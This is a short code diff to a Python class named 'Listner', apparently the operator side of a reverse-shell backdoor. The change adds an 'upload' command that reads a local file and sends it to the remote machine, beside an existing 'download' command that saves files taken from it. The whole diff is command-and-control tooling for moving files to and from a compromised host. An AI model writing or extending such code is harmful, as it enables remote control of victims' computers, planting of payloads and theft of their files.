@@ -37,13 +37,22 @@ class Listner:
     def write_file(self,path,content):
         with open(path,"wb") as file:
             file.write(content)
-            return "[+] Download successful"
+            return "[+] Upload successful"
+
+    def read_file(self,path):
+        with open(path,"rb") as file:
+            return file.read()
 
     def run(self):
         while(True):
             command = raw_input(">> ")
             command = command.split(" ")
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
+
             result = self.execute_remotely(command)
+
             if command[0] == "download" :
                 result = self.write_file(command[1],result)
             print(result)
